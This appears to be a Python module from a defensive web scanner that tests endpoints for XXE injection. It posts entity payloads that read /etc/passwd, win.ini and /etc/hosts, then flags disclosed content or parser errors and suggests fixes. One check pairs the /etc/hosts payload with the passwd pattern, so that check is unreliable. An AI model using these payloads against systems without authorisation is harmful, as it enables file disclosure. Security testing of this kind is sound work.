"""
XXE (XML External Entity) Injection Scanner.

XXE occurs when an XML parser processes external entity references
included in user-supplied XML, potentially exposing local files,
enabling SSRF, or causing denial of service.

Detection (read-only):
1. Find XML-accepting endpoints (Content-Type: text/xml, application/xml,
   endpoints with /xml, SOAP services, file upload accepting XML)
2. Send XXE payloads that reference predictable file paths (/etc/passwd)
3. Check if file content appears in the response (classic XXE)
4. Check for error messages revealing XML parser internals (blind indicator)
5. Check for DTD-related error messages

CWE-611: Improper Restriction of XML External Entity Reference
"""

import re
from typing import Any, Dict, List
from urllib.parse import urlparse

from bs4 import BeautifulSoup

from tblue.scanner.base import BaseScanner
from tblue.logger import get_logger, log_pass, log_fail, log_warn

logger = get_logger(__name__)

# Common XML-accepting endpoint patterns
_XML_PATHS = [
    "/api/xml", "/xml", "/upload", "/import", "/data",
    "/api/data", "/api/import", "/soap", "/wsdl",
    "/api/v1/data", "/api/v1/import", "/rss", "/feed",
    "/sitemap.xml", "/api/feed",
]

# XXE payloads — file disclosure probe
_XXE_PAYLOAD_PASSWD = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""

# XXE payload targeting Windows
_XXE_PAYLOAD_WIN = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
]>
<foo>&xxe;</foo>"""

# Blind XXE — server-side request (OOB; can only detect via error)
_XXE_PAYLOAD_BLIND = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<foo>&xxe;</foo>"""

# Simple DTD injection check (causes parser error on strict parsers)
_XXE_PAYLOAD_DTD = """<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
<test/>"""

_PASSWD_RE = re.compile(r"root:.*:0:0:|nobody:.*:/sbin/nologin", re.I)
_WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.I)

# XML parser error patterns (blind indicator — parser touched the DTD)
_XML_PARSER_ERR_RE = re.compile(
    r"xml.*parse.*error|SAXParseException|XMLSyntaxError|"
    r"ExternalEntityDeclaration|entity.*not.*declared|"
    r"failed to load external entity|DOCTYPE is disallowed|"
    r"Access to external resource denied|entity.*resolution.*failed",
    re.I,
)

_XML_HEADERS = {"Content-Type": "application/xml", "Accept": "application/xml, text/xml, */*"}


class XXEInjectionScanner(BaseScanner):
    """Detects XXE injection via file disclosure and XML parser error indicators."""

    def scan(self, url: str) -> List[Dict[str, Any]]:
        self.results = []

        resp = self.http.get(url)
        if resp is None:
            log_pass(logger, f"No response — skipping XXE checks: {url}")
            self.results.append(self._result(
                url, "XXE injection — no response", "PASS",
                detail="Target did not respond; XXE injection checks skipped."
            ))
            return self.results

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        endpoint = self._find_xml_endpoint(base, resp.text or "", resp.headers)

        if not endpoint:
            log_pass(logger, f"No XML endpoint found for XXE checks: {url}")
            self.results.append(self._result(
                url, "XXE injection — no XML-accepting endpoint found", "PASS",
                detail=(
                    "No XML-accepting endpoint detected. No SOAP, XML upload, or XML API "
                    "paths responded to probes."
                )
            ))
            return self.results

        self._check_xxe(url, endpoint)

        if not self.results:
            log_pass(logger, f"No XXE indicators: {url}")
            self.results.append(self._result(
                url, "XXE injection — no indicators detected", "PASS",
                detail=(
                    "XXE payloads did not produce file disclosure or XML parser errors "
                    "indicating external entity processing is disabled."
                )
            ))

        return self.results

    def _find_xml_endpoint(self, base: str, body: str, headers: dict) -> str:
        # If main page itself speaks XML or SOAP
        ct = headers.get("Content-Type", "")
        if "xml" in ct.lower() or "soap" in ct.lower():
            return base + "/"

        # Check page for WSDL/SOAP links
        soup = BeautifulSoup(body, "html.parser")
        for link in soup.find_all("a", href=True):
            href = link["href"].lower()
            if "wsdl" in href or "soap" in href:
                return base + link["href"] if link["href"].startswith("/") else link["href"]

        # Try common paths
        for path in _XML_PATHS:
            r = self.http.get(base + path)
            if r is None:
                continue
            ct = r.headers.get("Content-Type", "").lower()
            if r.status_code in (200, 201, 400, 405, 415, 422) and (
                "xml" in ct or "json" in ct or r.status_code in (400, 405, 415, 422)
            ):
                return base + path

        return ""

    def _check_xxe(self, base_url: str, endpoint: str) -> None:
        payloads = [
            (_XXE_PAYLOAD_PASSWD, _PASSWD_RE, "Linux /etc/passwd"),
            (_XXE_PAYLOAD_WIN, _WIN_INI_RE, "Windows win.ini"),
            (_XXE_PAYLOAD_BLIND, _PASSWD_RE, "Linux /etc/hosts (blind)"),
        ]

        for payload, output_re, desc in payloads:
            resp = self.http.post(endpoint, data=payload, headers=_XML_HEADERS)
            if resp is None:
                continue

            body = resp.text or ""

            if output_re.search(body):
                log_fail(logger, f"XXE injection — {desc} content disclosed: {endpoint}")
                self.results.append(self._result(
                    endpoint,
                    f"XXE injection — {desc} disclosed via external entity",
                    "FAIL",
                    detail=(
                        f"The XML parser processed an external entity referencing {desc} "
                        "and returned its contents in the response. "
                        "This is a critical XXE vulnerability (CWE-611). "
                        "Fix: disable DOCTYPE/DTD processing entirely in XML parser config "
                        "(e.g., setFeature(FEATURE_DISALLOW_DOCTYPE_DECL, true) in Java; "
                        "libxml2: LIBXML_NONET | parser options; defusedxml in Python). "
                        "Never allow user-supplied XML to process external entities."
                    )
                ))
                return

            # Blind XXE — parser error reveals entity processing attempted
            if _XML_PARSER_ERR_RE.search(body):
                log_warn(logger, f"XXE injection — XML parser error (possible blind XXE): {endpoint}")
                self.results.append(self._result(
                    endpoint,
                    "XXE injection — XML parser error suggests external entity processing",
                    "WARN",
                    detail=(
                        "The XML parser returned an error related to external entity resolution "
                        "or DTD processing. This indicates the parser attempted to resolve the "
                        "external entity before failing, which is itself a risk. "
                        "Fix: disable external entity resolution and DTD processing entirely. "
                        "Use a hardened XML parser or defusedxml (Python) / secure-by-default "
                        "XML library."
                    )
                ))
                return

        # DTD injection check
        resp = self.http.post(endpoint, data=_XXE_PAYLOAD_DTD, headers=_XML_HEADERS)
        if resp and _XML_PARSER_ERR_RE.search(resp.text or ""):
            log_warn(logger, f"XXE injection — DTD processing error: {endpoint}")
            self.results.append(self._result(
                endpoint,
                "XXE injection — DTD processing attempted (parser error on DTD payload)",
                "WARN",
                detail=(
                    "The XML parser produced an error message related to parameter entity "
                    "or DTD processing when given a DTD-bearing payload. "
                    "Fix: disable DOCTYPE declarations at the parser level."
                )
            ))
